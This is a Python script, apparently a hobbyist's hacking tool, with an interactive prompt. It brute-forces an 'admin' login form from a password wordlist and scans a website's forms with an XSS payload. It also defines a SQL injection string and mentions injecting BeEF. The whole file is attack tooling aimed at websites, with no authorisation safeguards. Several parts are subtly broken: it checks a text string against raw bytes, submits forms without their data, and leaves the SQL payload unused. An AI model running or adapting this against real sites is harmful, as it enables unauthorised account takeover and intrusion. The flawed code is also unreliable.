'''
    author  : zerobits01
    created : 27-Jan-2020
    purpose : analysing a website for vulns
'''

# we use the crawler that we programmed before and we use
#  our knowledge and programming to automate the process of discovering vulns

import requests
import re
import argparse
from bs4 import BeautifulSoup
import urllib.parse as urlparse

'''
    we use the text box's and and params in urls
    to inject some code we should use this app against sites
    that run in SQL so first step is gathering some basic info about that site
'''
parser = argparse.ArgumentParser(description='''
    author : zerobits01
    purpose: vulnerability scanner and brute force
    gmail  : zerobits0101@gmail.com
    team   : Paradox-Squad
''',formatter_class=argparse.RawTextHelpFormatter)

# we can use args too
parser.add_argument('-b','--brute-foce',dest='brute_force',
                        action='store_true',default=False,
                            help='use this switch for bruteforcing a url')
parser.add_argument('-u','--url',
                        help='enter the url for scan or brute force',
                            type=str, required=True)
parser.add_argument('-s','--scan',help='use this switch for scanning the url')

parser.add_argument('-e','--enter',help='enter the program')
# args = parser.parse_args()

target_url = ''
data_dict = {"username":"admin","password":"","Login":"submit"}
passwd_path = ''

# we can also use a word list for username too or entering it manually
def brute_force():
    global passwd_path
    global data_dict
    username = 'admin'
    with open(passwd_path, "r") as wordlist_file:
        i = 1
        for line in wordlist_file:
            print(i)
            word = line.strip()
            data_dict["password"] = word
            try :
                response = requests.post(target_url, data=data_dict)
            except Exception:
                print('[-] Error occurred during sending request')
                exit(1)
            i = i+1
            if "Login failed" not in response.content:
                print("[+] username : %s, password : %s" % (username, word))
                return
        print("[!] Didn't found.")

def scanner():
    # like opening a browser
    session = requests.Session()

    # strings for sql injection and XSS(we can inject BeEf)
    js_injection = '<script>alert(\'hello from js\')</script>'
    sql_injection = 'test\' or 1 = 1 --'

    # extracting all forms
    response = session.get(target_url)
    parsed_html = BeautifulSoup(response.content)
    forms = parsed_html.findAll('form')


    # sending post requests for injection
    data_dict = {}

    # trying to inject all forms
    for form in forms:
        method = form.get('method') # getting attribs of tags
        inputs = form.findAll('input')
        for inp in inputs:
            url = urlparse.urljoin(target_url,form.get('action'))
            name = inp.get('name')
            inp_type = inp.get('type')
            inp_value = inp.get('value')
            data_dict[name] = inp_value
            if inp_type == 'text':
                data_dict[name] = js_injection
        if method == 'post':
            resp = session.post(url)
        else :
            resp = session.get(url, params=data_dict)
        if resp :
            if js_injection in resp.content:
                print('[+] vulnerable url : ',url)

            # with checking type we can inject and submit
            # we can get the name and creating a dictionary and sending it





# don't automate jobs try them that way you will be always steady for everything
while True:
    cmnd = input('zbits# ').strip()
    cmnd = cmnd.lower()

    if cmnd.startswith('set'):
        gp1 = gp2 = None
        try :
            if cmnd.__contains__('url'):
                gp1 = re.search(r'\s*set\s+url\s+(?P<url>\S+)\s*',cmnd).group('url')
            elif cmnd.__contains__('wordlist'):
                gp2 = re.search(r'\s*set\s+wordlist\s+(?P<path>\S+)',cmnd).group('path')
        except Exception as e:
            # print('[!] bad input')
            # print('[-] err : %s'%(e))
            pass
        target_url = gp1 if gp1  else target_url
        passwd_path = gp2 if gp2 else passwd_path

    elif cmnd.startswith('start'):
        # TODO : using and handling exceptions
        if re.search(r'start\s+brute-force',cmnd).group(0):
            brute_force()
        elif re.search(r'start\s+scan',cmnd).group(0):
            scanner()
    elif re.match(r'^show\s+options$',cmnd):
        print('url : ',target_url)
        print('wordlist : ', passwd_path)
    elif cmnd == 'help':
        help_str = '''
        set  : set the options
            set url example.com
                if you gonna use bruteforce enter a vulnerable
                    url with variables
            set wordlist /path/to/wordlist

        start: to start scan or brute-force
            start scan
            start brute-force

        show options : prints the options and values

        help : print this help string
        '''
        print(help_str)
    elif re.match(r'\s*exit\s*',cmnd):
        exit(0)
    else:
        print('[!] command not found')